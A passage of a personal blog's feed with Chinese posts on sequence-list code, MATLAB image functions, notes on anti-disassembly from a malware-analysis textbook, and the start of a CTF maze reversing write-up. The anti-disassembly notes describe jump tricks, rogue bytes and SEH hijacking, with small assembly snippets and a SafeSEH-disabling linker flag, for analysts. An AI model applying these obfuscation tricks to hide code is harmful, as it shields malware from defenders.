"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>释放表</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DestroyList_Sq</span><span class="params">(SqList&amp; L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">free</span>(L.elem);</span><br><span class="line">    L.listsize = <span class="number">0</span>;</span><br><span class="line">    L.length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二-Vector实现"><a href="#二-Vector实现" class="headerlink" title="二 Vector实现"></a>二 Vector实现</h2><blockquote><p>Vector常用操作</p></blockquote><ol><li><p>push_back 在数组的最后添加一个数据</p></li><li><p>pop_back 去掉数组的最后一个数据</p></li><li><p>at 得到编号位置的数据</p></li><li><p>begin 得到数组头的指针</p></li><li><p>end 得到数组的最后一个单元+1的指针</p></li><li><p>front 得到数组头的引用</p></li><li><p>back 得到数组的最后一个单元的引用</p></li><li><p>max_size 得到vector最大可以是多大</p></li><li><p>capacity 当前vector分配的大小</p></li><li><p>size 当前使用数据的大小</p></li><li><p>resize 改变当前使用数据的大小，如果它比当前使用的大，者填充默认值</p></li><li><p>reserve 改变当前vecotr所分配空间的大小</p></li><li><p>erase 删除指针指向的数据项</p></li><li><p>clear 清空当前的vector</p></li><li><p>rbegin 将vector反转后的开始指针返回(其实就是原来的end-1)</p></li><li><p>rend 将vector反转构的结束指针返回(其实就是原来的begin-1)</p></li><li><p>empty 判断vector是否为空</p></li><li><p>swap 与另一个vector交换数据</p></li></ol><blockquote><p>初始化</p></blockquote><p>只需将顺序表长度置零</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> sqlist::init()</span><br><span class="line">&#123;</span><br><span class="line">    len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>清空 </p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> sqlist::clear()</span><br><span class="line">&#123;</span><br><span class="line">    v.clear();</span><br><span class="line">    len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>判断是否为空<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span> sqlist::is_empty()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (len == <span class="number">0</span>) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>获取数据</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Seqlist_t sqlist::get_elem(<span class="keyword">int</span> i)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> v.at(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>查找数据</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> sqlist::get_locate(Seqlist_t e)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">        <span class="keyword">if</span> (e.element == v.at(i).element)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">return</span> (i != len) ? (i) : (<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在尾部添加数据</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> sqlist::add_back(Seqlist_t e)</span><br><span class="line">&#123;</span><br><span class="line">    v.push_back(e);</span><br><span class="line">    len++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>删除最后一个数据</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> sqlist::delete_back()</span><br><span class="line">&#123;</span><br><span class="line">    v.pop_back();</span><br><span class="line">    len--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>指定位置插入数据</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> sqlist::insert_elem(Seqlist_t e, <span class="keyword">int</span> i)</span><br><span class="line">&#123;</span><br><span class="line">    v.insert(v.begin() + i, e);</span><br><span class="line">    len++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>删除指定位置数据</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> sqlist::delete_elem(<span class="keyword">int</span> i)</span><br><span class="line">&#123;</span><br><span class="line">    v.erase(v.begin() + i);</span><br><span class="line">    len--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>遍历数据</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> sqlist::traverse()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"The element is "</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; v.at(i).element &lt;&lt; <span class="string">' '</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>From <a href="https://kabeor.github.io/(Sequence List">https://kabeor.github.io/(Sequence List)顺序表算法分析/</a>顺序表算法分析/) bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Sequence-List-顺序表算法分析&quot;&gt;&lt;a href=&quot;#Sequence-List-顺序表算法分析&quot; class=&quot;headerlink&quot; title=&quot;(Sequence List)顺序表算法分析&quot;&gt;&lt;/a&gt;(Sequence List)顺序表算法分析
      
    
    </summary>
    
      <category term="Code" scheme="https://kabeor.github.io/categories/Code/"/>
    
    
      <category term="数据结构" scheme="https://kabeor.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>MATLAB图像处理常用函数</title>
    <link href="https://kabeor.github.io/MATLAB%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/"/>
    <id>https://kabeor.github.io/MATLAB图像处理常用函数/</id>
    <published>2019-01-27T13:00:32.081Z</published>
    <updated>2019-01-28T01:19:26.250Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MATLAB图像处理常用函数"><a href="#MATLAB图像处理常用函数" class="headerlink" title="MATLAB图像处理常用函数"></a>MATLAB图像处理常用函数</h1><p>期末考完一直在忙着写机器学习图像识别的项目，简单记录一下</p><h2 id="数字图像的读取"><a href="#数字图像的读取" class="headerlink" title="数字图像的读取"></a>数字图像的读取</h2><blockquote><p>imread<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">imread( ‘filename’ );</span><br><span class="line">其中，filename是一个含有图像文件全名的字符串,包括文件的扩展名。单引号‘’来界定filename字符串。结尾处用分号在MATLAB中用于取消输出。</span><br><span class="line"></span><br><span class="line">size(I);</span><br><span class="line">函数size可以给出图像的行数和列数。如果size前面没有变量，则存在ans变量里。如果有变量，比如[M，N]=size(I);则该命令将返回函数的行数M和列数N。</span><br></pre></td></tr></table></figure></p></blockquote><h2 id="数字图像显示"><a href="#数字图像显示" class="headerlink" title="数字图像显示"></a>数字图像显示</h2><blockquote><p>imshow(I, G)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">G是显示该图像的灰度级数，若将G省略，则默认的灰度级数为256</span><br></pre></td></tr></table></figure></p><p>imshow(I, [low high])<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">会将所有小于或等于low的值都显示为黑色，所有大于或等于high的值都显示为白色。界于low和high之间的值将以默认的级数显示为中等亮度值。</span><br></pre></td></tr></table></figure></p><p>imshow(I,[])<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以将变量low设置为数组f的最小值，将变量high设置为数组f的最大值。该函数用来显示动态范围较小的图像时非常有用。</span><br></pre></td></tr></table></figure></p></blockquote><h2 id="图像保存"><a href="#图像保存" class="headerlink" title="图像保存"></a>图像保存</h2><blockquote><p>imwrite(f, ’filename’)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">该函数的功能是使用函数imwrite可以将图像写到磁盘上的filename命令的文件中。Filename必须包含文件的扩展名。</span><br></pre></td></tr></table></figure></p></blockquote><h2 id="图像类型转换"><a href="#图像类型转换" class="headerlink" title="图像类型转换"></a>图像类型转换</h2><blockquote><p>G=im2bw(I,T)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">该函数的功能就是将亮度图像I转换为一幅二值图像G。在亮度图像中，亮度值小于T的像素点全部转换为二值图像中值为0的像素点；在亮度图像中，亮度值大于T的像素点全部转换为二值图像中值为1的像素点。</span><br></pre></td></tr></table></figure></p><p>G=rgb2gray(I)<br><code>该函数将彩色图像数组I转换为灰度图像G。</code></p></blockquote><h2 id="图像的几何操作"><a href="#图像的几何操作" class="headerlink" title="图像的几何操作"></a>图像的几何操作</h2><blockquote><p>imread 加<br>imsubtract 减</p><p>imresize 缩放<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">imresize(A,scale,method)</span><br><span class="line">imresize(A,[mrows ncols],method)</span><br><span class="line">method</span><br><span class="line">Nearest:最近邻插值</span><br><span class="line">Bilinear:双线性插值</span><br><span class="line">Bicubic:双三次插值，系统默认值</span><br></pre></td></tr></table></figure></p><p>imrotate(A,angle,method) 旋转<br>逆时针为正，顺时针为负。</p></blockquote><h2 id="亮度变换"><a href="#亮度变换" class="headerlink" title="亮度变换"></a>亮度变换</h2><blockquote><p>imadjust<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">g=imadjust(f,[low_in high_in],[low_out high_out], gamma)</span><br><span class="line"></span><br><span class="line">将图像f中的亮度值映像到g中的新值，即将low_in至high_in之间的值映射到low_out至high_out之间的值。</span><br><span class="line">low_in以下的值映射为low_out, high_in以上的值映射为high_out.</span><br></pre></td></tr></table></figure></p></blockquote><h2 id="图像直方图函数"><a href="#图像直方图函数" class="headerlink" title="图像直方图函数"></a>图像直方图函数</h2><blockquote><p>imhist</p></blockquote><h2 id="滤波函数"><a href="#滤波函数" class="headerlink" title="滤波函数"></a>滤波函数</h2><blockquote><p>线性空间滤波函数<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">B=imfilter(A,H)</span><br><span class="line">A是输入图像，B是滤波后的输出图像，H是滤波模板</span><br><span class="line"></span><br><span class="line">imfilter(I,fspecial(&apos;average&apos;,[3 3]));</span><br></pre></td></tr></table></figure></p><p>高斯滤波<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">imfilter(I,fspecial(&apos;gaussian&apos;,[3 3]));</span><br></pre></td></tr></table></figure></p><p>中值滤波<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">medfilt2(I,[3,3]);</span><br></pre></td></tr></table></figure></p></blockquote><p>From <a href="https://kabeor.github.io/MATLAB图像处理常用函数/">https://kabeor.github.io/MATLAB图像处理常用函数/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MATLAB图像处理常用函数&quot;&gt;&lt;a href=&quot;#MATLAB图像处理常用函数&quot; class=&quot;headerlink&quot; title=&quot;MATLAB图像处理常用函数&quot;&gt;&lt;/a&gt;MATLAB图像处理常用函数&lt;/h1&gt;&lt;p&gt;期末考完一直在忙着写机器学习图像识别的项目，
      
    
    </summary>
    
      <category term="Code" scheme="https://kabeor.github.io/categories/Code/"/>
    
    
      <category term="matlab, 图像处理" scheme="https://kabeor.github.io/tags/matlab-%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>第15章  对抗反汇编</title>
    <link href="https://kabeor.github.io/%E7%AC%AC15%E7%AB%A0%20%20%E5%AF%B9%E6%8A%97%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
    <id>https://kabeor.github.io/第15章  对抗反汇编/</id>
    <published>2018-10-18T10:42:41.480Z</published>
    <updated>2019-02-14T03:21:29.852Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第15章-对抗反汇编"><a href="#第15章-对抗反汇编" class="headerlink" title="第15章  对抗反汇编"></a>第15章  对抗反汇编</h1><h2 id="1-何谓对抗反汇编技术"><a href="#1-何谓对抗反汇编技术" class="headerlink" title="1. 何谓对抗反汇编技术"></a>1. 何谓对抗反汇编技术</h2><p>实现对抗反汇编时，恶意代码编写者会创建一段代码序列，欺骗反汇编器，让反汇编器展示与真正执行的代码不同的指令列表。</p><h2 id="2-挫败反汇编算法"><a href="#2-挫败反汇编算法" class="headerlink" title="2. 挫败反汇编算法"></a>2. 挫败反汇编算法</h2><p>对抗反汇编技术是基于反汇编算法的天生漏洞而产生的。为了清晰地显示反汇编代码，反汇编器在事前都会做某种特定的假设。一旦这种假设不成立，恶意代码作者就有机会欺骗分析人员。</p><p>反汇编算法可以分为两种：线性反汇编算法和面向代码流的反汇编算法。其中线性反汇编算法容易实现，但也易出错。</p><h3 id="线性反汇编"><a href="#线性反汇编" class="headerlink" title="线性反汇编"></a>线性反汇编</h3><p>线性反汇编策略是遍历一个代码段,一次一条指令的线性反汇编,从不偏离。反汇编器使用的这个基本策略已经被反汇编写作教程采用,并且被调试器广泛使用。线性反汇编用已经反汇编的指!令大小来决定下一个要反汇编的字节,而不考虑代码流的控制指令</p><blockquote><p>利用反汇编库libdisasm，C实现基于线性反汇编算法的反汇编器</p></blockquote><p><img src="https://i.loli.net/2018/10/18/5bc8774662859.jpg" alt=""></p><p>本例中,名为 buffer的数据缓冲区包含需要反汇编的指令。函数x86 disasm将会用刚刚反汇编过的具体指令填充一个数据结构,然后返回这个指令的大小。如果反汇编是一条合法指令,这个循环会用size值递增 position变量(如1所示),否则递增1(如2所示)</p><p>这个代码片段中的许多指令拥有多个字节,恶意代码编写者利用线性反汇编算法的关键方法是植入能够组成多字节指令机器码的数据字节。例如,标准的本地ca11指令有5个字节,以机器码0xE8开头。如果16字节数据组成一个以值0xE8结尾的开关表,那么当反汇编器碰到Call指令的机器码时会将接下来的4个字节当作操作数对待,而不是当作下一个函数的开头。</p><p>线性反汇编算法不能区分代码与数据,因此最容易被恶意代码挫败。</p><h3 id="面向代码流的反汇编"><a href="#面向代码流的反汇编" class="headerlink" title="面向代码流的反汇编"></a>面向代码流的反汇编</h3><p>面向代码流的反汇编与线性反汇编的主要不同在于，面向代码流的反汇编器并不盲目地反汇编整个缓冲区，也不假设代码段中仅包含指令而不包含数据。相反，它会检查每一条指令，然后建立一个需要反汇编的地址列表。</p><p>如果IDAPro产生了不正确的反汇编代码，你可以利用键盘上的C键或D键，手动将指令转换成数据或者将数据转换成指令。步骤如下：</p><ol><li>按C键可以将光标位置的数据转换成代码。</li><li>按D键可以将光标位置的代码转换成数据。</li></ol><h2 id="3-对抗反汇编技术"><a href="#3-对抗反汇编技术" class="headerlink" title="3. 对抗反汇编技术"></a>3. 对抗反汇编技术</h2><p>恶意代码最常见的对抗反汇编技术的主要方法是利用反汇编器选择算法和假设算法的漏洞，使反汇编器产生错误的反汇编代码。</p><h3 id="相同目标的跳转指令"><a href="#相同目标的跳转指令" class="headerlink" title="相同目标的跳转指令"></a>相同目标的跳转指令</h3><p>恶意代码中最常见的对抗反汇编技术是使用指向同一目的地址的两个连续条件跳转指令。</p><p>如果jz1oc_512指令之后是jnz loc_512，则总是跳转到loc_512。jz指令与jnz指令的结合，在效果上等于无条件跳转指令jmp，因为反汇编器每次只反汇编一条指令，所以并不会意识到这种情况。当反汇编器遇到jnz指令时，依然会反汇编这个指令的false分支，尽管事实上这个分支永远不会执行。</p><h3 id="固定条件的跳转指令"><a href="#固定条件的跳转指令" class="headerlink" title="固定条件的跳转指令"></a>固定条件的跳转指令</h3><p>在恶意代码中，另一种常见的对抗反汇编技术是由跳转条件总是相同的一条跳转指令构成的。</p><p><img src="https://i.loli.net/2018/11/22/5bf6910ff2758.jpg" alt=""></p><p>注意这段代码以xor eax，eax指令开头，这条指令的作用是将EAX寄存器置0，与此同时它也会设置标志寄存器的zero标志。下一条指令是条件跳转指令，如果标志寄存器zero标志被置位，它就会执行跳转。事实上，这根本不是条件跳转，因为在程序的这个位置，我们可以保证zero标志总是被置位的。</p><blockquote><p>xor指令与相邻jz指令的永假关系</p></blockquote><p><img src="https://i.loli.net/2018/11/22/5bf6917871865.jpg" alt=""></p><h3 id="无效的反汇编指令"><a href="#无效的反汇编指令" class="headerlink" title="无效的反汇编指令"></a>无效的反汇编指令</h3><p>前面讨论的简单的对抗反汇编技术是巧妙地在条件跳转指令之后放一个字节，这种技术的思路是，从这个字节开始反汇编，阻止其后真正的指令被反汇编，因为插入的字节是一个多字节指令的机器码。我们称这样的字节为流氓字节，因为它不属于程序的一部分，只是用在代码段迷感反汇编器。</p><p>但是，如果流氓字节不能被忽略，如果它是合法指令的一部分，且在运行时能够被正确执行怎么办？这里，我们碰到一个棘手的问题，所有给定字节都是多字节指令的一部分，而且它们都能够被执行。目前业内没有一个反汇编器能够将单个字节表示为两条指令的组成部分，然而处理器并没有这种限制。</p><blockquote><p>内部跳转的jmp指令</p></blockquote><p><img src="https://i.loli.net/2018/11/22/5bf69651b711b.jpg" alt=""></p><p>当试图表达这个反汇编序列时，会十分困惑，因为如果将字节FF作为jmp指令的一部分，那么就不能作为inc eax指令的开头来进行显示。字节FF同时作为两条实际运行指令的一部分，而现代反汇编器并没有办法表达这种情况。这4个字节序列首先递增EAX，然后递减EAX。实际上，这是一个复杂的NOP序列，几乎可以插入程序的任何位置，从而破坏有效的反汇编链。为了解决这个问题，恶意代码分析人员常使用IDC或者IDAPython脚本，调用PatchByte函数，用NOP指令序列替换这个字节序列，另一种办法是使用D键将这样的字符序列全部转换成数据，让这4个字节之后的反汇编恢复正常。</p><blockquote><p>多层内部调转序列</p></blockquote><p><img src="https://i.loli.net/2018/11/22/5bf697244514f.jpg" alt=""></p><p>在字节序列中，第一条指令是4字节的mov指令，其最后2个字节被高亮显示，因为它既是mov指令的一部分，同时也作为随后运行的一条指令。第一条指令会用数据填充AX寄存器。第二条指令xor会归零这个寄存器，且将标志寄存器zero置0。第三条指令是一个条件跳转指令，当标志寄存器zero标志置位时，它执行跳转。实际上它不是一个条件跳转，因为它的前一条指令总是设置zero标志。反汇编器会反汇编紧跟jz的指令，该指令以字节0xE8开头，0xE8是一个5字节call指令的机器码。然而这条以0xE8开头的指令实际上永远不会执行。</p><p>在这种情况下，反汇编器不能正确反汇编jz指令目标，因为这个字节已经被正确表达为mov指令的一部分。jz指令指向的代码总会被执行，因为jz指令运行时，zero标志总是被置位。指令z跳转到4字节的mov指令中间。mov指令的最后两个字节是存放在寄存器中的操作数。当单独反汇编或者运行这个操作数时，它又会组成一个jmp指令，这条jmp指令会从指令末尾向前跳转5个字节。</p><blockquote><p>IDAPython将字节换成NOP</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">NopBytes</span><span class="params">(start,length)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,length):</span><br><span class="line">    PatchByte(start+i, <span class="number">0x90</span>)</span><br><span class="line">MakeCode(start)</span><br><span class="line">NopBytes(起始地址,长度)</span><br></pre></td></tr></table></figure><h3 id="用IDA-PRO对指令进行NOP替换"><a href="#用IDA-PRO对指令进行NOP替换" class="headerlink" title="用IDA PRO对指令进行NOP替换"></a>用IDA PRO对指令进行NOP替换</h3><p>如下脚本的作用是创建一个热键ALT+N，一旦脚本运行，无论用户何时按下ALT+N组合键，IDAPro都会使用NOP指令替换当前光标位置处的字节。它也能简单地将光标移到下一条指令处，从而使替换大块代码变得更容易。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"></span><br><span class="line">idaapi.Compileline(<span class="string">'static n_key()&#123; RunPythonStatement("nopIt()");&#125;'</span>)</span><br><span class="line"></span><br><span class="line">AddHotkey(<span class="string">"Alt-N"</span>,<span class="string">"n_key"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nopIt</span><span class="params">()</span>:</span></span><br><span class="line">    start=ScreenEA()</span><br><span class="line">    end=NextHead(start)</span><br><span class="line">    <span class="keyword">for</span> ea <span class="keyword">in</span> range(start, end): PatchByte(ea,<span class="number">0x90</span>)</span><br><span class="line">    Jump(end) Refresh()</span><br></pre></td></tr></table></figure><h2 id="4-混淆控制流图"><a href="#4-混淆控制流图" class="headerlink" title="4. 混淆控制流图"></a>4. 混淆控制流图</h2><h3 id="函数指针问题"><a href="#函数指针问题" class="headerlink" title="函数指针问题"></a>函数指针问题</h3><p>在C语言程序中刻意使用函数指针，这可以大大降低反汇编器自动推导出程序流的信息量。如果在汇编语言中刻意使用函数指针或者在源码中构造不标准的函数指针格式，会导致在没有动态分析的前提下很难进行逆向工程。</p><h3 id="在IDA-Pro中添加代码的交叉引用"><a href="#在IDA-Pro中添加代码的交叉引用" class="headerlink" title="在IDA Pro中添加代码的交叉引用"></a>在IDA Pro中添加代码的交叉引用</h3><p>使用IDC中名为AddCodeXref的函数。它有三个参数：交叉引用来源的位置、交叉引用指向的位置，以及流的类型。这个函数可以支持多个不同的流类型，但最常用的是普通call指令类型fl_CF，或是跳转指令的类型fl_JF。</p><h3 id="滥用返回指针"><a href="#滥用返回指针" class="headerlink" title="滥用返回指针"></a>滥用返回指针</h3><p>在程序中，call指令和jmp指令并不是唯一转换控制流的指令。与call指令对应的指令是retn（也被表示为ret）。call指令与jmp指令功能类似，不同的是它将函数返回地址压入到栈中，返回点是紧随call指令的一个内存地址。</p><p>call指令等同于jmp指令加push指令，retn指令等同于jmp指令加pop指令。retn指令首先从栈顶弹出一个值（返回值地址），然后跳转到这个值所表示的地址处。retn通常被用来返回一个函数调用，但由于体系结构的限制，它不能用于一般的执行控制流。</p><p>当retn指令不以函数调用返回的方式被使用时，这种技术的最显著结果是反汇编器不能显示代码中任何要跳转的交又引用目标。另一个显著的结果是反汇编器会提前结束这个函数。</p><h3 id="滥用结构化异常处理"><a href="#滥用结构化异常处理" class="headerlink" title="滥用结构化异常处理"></a>滥用结构化异常处理</h3><p>结构化异常处理（SEH）提供一种控制流的方法，该方法不能被反汇编器采用，但可以用来欺骗反汇编器。SEH是×86体系结构的一种功能，旨在为程序提供一种智能处理错误条件的方法。编程语言例如C++，Ada等，严重依赖异常处理，并且在x86系统上编译时会自动翻译成SEH。</p><p>异常触发可能有多种原因，例如访问一个无效内存区域、除零等。也可以调用函数RaiseException产生额外的软件异常。</p><p>SEH链是一个函数列表，设计它的目的是处理线程中的异常。列表中的每个函数，要么处理异常，要么将异常传递到列表中的下一个函数。如果一个异常总是被传递到最后一个异常处理函数处，就会被认为是一个不能处理的异常。这种情况下，最后一个异常处理函数会负责弹出一个熟悉的消息对话框，通知用户“an unhandled exception has occurred”。在大多数进程中，异常是有规律地产生的，但在到达最后状态（使程序崩溃并通知用户）之前，异常都会被静悄悄的处理。</p><p>为了查找SEH链，操作系统会检查FS段寄存器。这个寄存器包含一个段选择子，使用段选择子可以得到线程环境块（TEB）。TEB中第一个数据结构是线程信息块（TIB）。TIB中的第一个元素（即TIB的第一个字节）就是SEH链的指针。SEH链是一个简单的8字节数据结构链表，这个8字节数据结构叫作EXCEPTION_REGISTRATION记录。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct_EXCEPTION_RECISTRATION&#123;</span><br><span class="line">    DWORD prev；</span><br><span class="line">DWORD handler；</span><br><span class="line">&#125;；</span><br></pre></td></tr></table></figure></p><p>EXCEPTION_REGISTRATION记录的第一个元素是一个指向前一个记录的指针。第二个元素则是一个指向异常处理函数的指针。</p><p>从概念上讲，这个链表以栈的方式进行操作。第一个调用的是最后一个加入链表的记录。由于子进程的调用与嵌套的异常处理块的原因，SEH链的增长和缩小等同于程序中异常处理层的改变，所以SEH记录总是建在栈上。</p><p>利用SEH实现变相控制程序流，并不需要在意当前异常处理链有多少个记录，只需要了解怎么将自己的异常处理添加到链表的头部</p><p><img src="https://i.loli.net/2018/11/22/5bf69c4ebab61.jpg" alt="">。</p><p>为了将一条记录添加到这个链中，我们需要在栈上构造一条新记录。因为记录结构由两个DWORD变量组成，所以使用两个push指令来完成。栈是向上增长的，所以第一个push进栈的是异常处理函数指针，第二个push进栈的是下一条记录的指针。当添加一条记录到链表的头部时，下一条记录需要完成的异常处理是当前的栈项，它由fs[e]指针给出。下面是实现这一功能的代码：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push ExceptionHandler </span><br><span class="line">push fs:[0]</span><br><span class="line">mov fs:[0]，esp</span><br></pre></td></tr></table></figure></p><p>异常发生时，将首先调用函数ExceptionHandler。这个动作会受到微软的软件数据执行保护机制（软件DEP，也被称为SafeSEH）的限制。</p><p>软件DEP是一项安全功能，它的目的是阻止程序运行过程中添加第三方的异常处理。对于硬编码的代码，有几种方法能够绕过这种技术，例如使用支持SafeSEH指令的汇编器。另外，使用微软的C编译器也能达到此目的，添加/SAFESEH:NO到链接器命令行，就可使这种限制无效。</p><p>当调用ExceptionHandler函数时，栈将被大幅改变。幸运的是，要达到我们的目的，没必要检查添加到栈中的所有数据。我们必须知道怎么返回异常发生前的栈位置。回想一下，我们的目的是混淆控制流且使程序不能正确处理异常。</p><p>当异常处理被调用时，操作系统添加了其他的SEH处理。为了让程序恢复正常操作，不仅要将我们的异常处理从异常处理链中断开，还要将系统添加的异常处理从异常处理链中断开。因此，我们需要从esp+8处而不是esp处取出原始的栈指针。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov esp，[esp+8]</span><br><span class="line">mov eax，fs:[0]</span><br><span class="line">mov eax，[eax]mov eax，[eax]</span><br><span class="line">mov fs:[0]，eax add esp，8</span><br></pre></td></tr></table></figure></p><h3 id="5-挫败栈帧分析"><a href="#5-挫败栈帧分析" class="headerlink" title="5. 挫败栈帧分析"></a>5. 挫败栈帧分析</h3><p>为了解决栈帧的轻微调整（用栈帧分析的固有易犯错特性偶尔会导致这种情况发生），在IDA Pro中，将光标放到某个特定反汇编行上，然后通过按ALT+K组合键，输入调整的栈指针值。</p><p>From <a href="https://kabeor.github.io/第15章  对抗反汇编/">https://kabeor.github.io/第15章  对抗反汇编/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第15章-对抗反汇编&quot;&gt;&lt;a href=&quot;#第15章-对抗反汇编&quot; class=&quot;headerlink&quot; title=&quot;第15章  对抗反汇编&quot;&gt;&lt;/a&gt;第15章  对抗反汇编&lt;/h1&gt;&lt;h2 id=&quot;1-何谓对抗反汇编技术&quot;&gt;&lt;a href=&quot;#1-何谓对抗反汇
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
      <category term="第五篇 逆向工程" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%BA%94%E7%AF%87-%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>SUS十一欢乐赛 re200 maze</title>
    <link href="https://kabeor.github.io/SUS%E5%8D%81%E4%B8%80%E6%AC%A2%E4%B9%90%E8%B5%9B%20re200%20maze/"/>
    <id>https://kabeor.github.io/SUS十一欢乐赛 re200 maze/</id>
    <published>2018-10-07T02:51:14.484Z</published>
    <updated>2018-10-07T04:24:56.680Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SUS十一欢乐赛-re200-maze"><a href="#SUS十一欢乐赛-re200-maze" class="headerlink" title="SUS十一欢乐赛 re200 maze"></a>SUS十一欢乐赛 re200 maze</h1><p><img src="https://i.loli.net/2018/10/07/5bb9757376a67.jpg" alt=""></p><p>x64的ELF，载入IDA64</p><p>题目已经告诉是迷宫了，搜索一下字符串</p><p><img src="https://i.loli.net/2018/10/07/5bb9764bbf2b6.jpg" alt=""></p><p>看到map<br><code>oooo*oooooxxxxoxxooxooooxoooxxoxxxooooxxxooxooooxooxxooooxxxoxooooxoxxxxoooooooox</code></p><p>但目前不知道map规格，于是跟随SUSCTF{字符跳转，F5</p><p><img src="https://i.loli.net/2018/10/07/5bb977240df3c.jpg" alt=""></p><p>很明显第18行检查输入长度是否为18<br><code>if (std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::length(&amp;v12) != 18 )</code></p><p>下面是方向控制 awsd</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for ( i = 0; i &lt;= 17; ++i 